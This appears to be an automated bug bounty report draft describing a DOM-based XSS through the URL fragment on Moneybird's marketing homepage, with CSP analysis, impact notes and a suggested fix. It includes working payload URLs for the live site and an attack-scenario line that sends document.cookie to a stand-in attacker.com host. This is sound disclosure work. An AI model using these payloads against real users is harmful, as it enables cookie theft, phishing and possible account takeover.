# DOM-Based XSS via URL Fragment on www.moneybird.com

**Program:** Moneybird (HackerOne)
**Severity:** Medium (low-end) — DOM XSS on marketing homepage; no auth context
**CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
**OWASP:** A03:2021 — Injection
**Status:** PENDING HUMAN VERIFICATION
**Scan date:** 2026-03-22 (SecBot v1.1)
**Detection method:** Playwright dom-sink (automated execution confirmed)

---

## Summary

The homepage at `https://www.moneybird.com/` writes URL fragment content directly into
the DOM via at least two `innerHTML` sinks without sanitization. An attacker can craft
a URL containing an HTML/JavaScript payload in the fragment (`#`) and trick a user into
visiting it, causing arbitrary JavaScript execution in the victim's browser.

The page's `Content-Security-Policy` is currently enforced only in **report-only** mode
(`Content-Security-Policy-Report-Only`), which does not block execution. Even if enforced,
the policy explicitly permits `'unsafe-inline'` in `script-src`, so the CSP provides
no protection against this attack.

**⚠️ Verification note:** This is on the marketing homepage (`www.moneybird.com`), not the
authenticated accounting app. The actual impact depends on whether authenticated users'
session cookies are accessible from this origin. Please verify before submitting.

---

## Steps to Reproduce

### Browser (human verification — recommended before submitting)

1. Open a fresh browser window (not logged into Moneybird)
2. Navigate to:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
3. Observe an alert dialog displaying `www.moneybird.com` — confirming JavaScript execution
4. Replace `alert(document.domain)` with a payload demonstrating cookie access:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.cookie)>
   ```
5. Note which cookies (if any) are visible — this determines actual severity

### Automated detection (SecBot evidence)

SecBot confirmed the marker string `secbot-xss-37` appeared in two `innerHTML` sinks
after loading:
```
https://www.moneybird.com/#<img src=x onerror=alert("secbot-xss-37")>
```

Evidence from scan (2026-03-22T12:45:31Z):
```
Payload: #<img src=x onerror=alert("secbot-xss-37")>
Sinks: innerHTML-set, innerHTML-set
Test URL: https://www.moneybird.com/#<img src=x onerror=alert("secbot-xss-37")>
Response indicators: ["secbot-xss-37", "secbot-xss-37"]
```

Note: `curl` cannot reproduce DOM-based XSS — the fragment is processed entirely
client-side (never sent to the server). Verification requires a real browser.

---

## Attack Scenario

1. Attacker crafts a malicious Moneybird URL:
   ```
   https://www.moneybird.com/#<script>document.location='https://attacker.com/?c='+document.cookie</script>
   ```
   (or using `<img onerror>` for CSP bypass)

2. Attacker sends this link to a Moneybird user via email, social engineering, or
   by embedding it in a phishing page.

3. When the victim clicks the link, their browser executes the attacker's JavaScript
   under the `www.moneybird.com` origin.

4. The attacker can:
   - Redirect the victim to a phishing login page (credential harvesting)
   - Deface the marketing page to undermine user trust
   - Read any cookies accessible from `www.moneybird.com` (scope: `.moneybird.com`)
   - If the authenticated app shares the `moneybird.com` domain/cookies:
     escalate to session hijacking

---

## CSP Analysis

Response headers confirm CSP is **not enforced** (report-only only):

```
Content-Security-Policy-Report-Only: default-src 'self' https://*.wistia.com ...;
  script-src 'self' 'unsafe-inline' 'unsafe-eval' ...
```

- `Content-Security-Policy` (enforced): **absent**
- The report-only CSP explicitly includes `'unsafe-inline'` in `script-src`
- Enforcing the current policy would still not block `<img onerror>` event handlers
  because `'unsafe-inline'` permits all inline event handlers

---

## Impact

**On the marketing page (confirmed):**
- JavaScript execution under `www.moneybird.com` origin
- Phishing via page manipulation or redirect
- Cookie theft from `www.moneybird.com` scope (analytics/session cookies at this origin)

**Potential escalation (needs verification):**
- If Moneybird serves the authenticated accounting app from a path on `moneybird.com`
  (e.g., `app.moneybird.com` shares cookies with `.moneybird.com`), an attacker can
  exfiltrate session tokens, perform account takeover, and access financial records
  (invoices, contacts, ledger data) belonging to the victim

---

## Suggested Fix

Replace `innerHTML` with `textContent` for any content derived from `window.location.hash`:

```javascript
// VULNERABLE
element.innerHTML = window.location.hash.slice(1);

// SAFE — plain text insertion
element.textContent = window.location.hash.slice(1);

// SAFE — if HTML rendering is required
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
```

Additionally, enforce the existing CSP (change `Content-Security-Policy-Report-Only`
to `Content-Security-Policy`) and remove `'unsafe-inline'` from `script-src`.

---

## References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP DOM XSS: https://owasp.org/www-community/attacks/DOM_Based_XSS
- PortSwigger DOM XSS: https://portswigger.net/web-security/cross-site-scripting/dom-based

---

*Drafted by SecBot Report Drafter — 2026-09-16. Requires human browser verification before submission.*
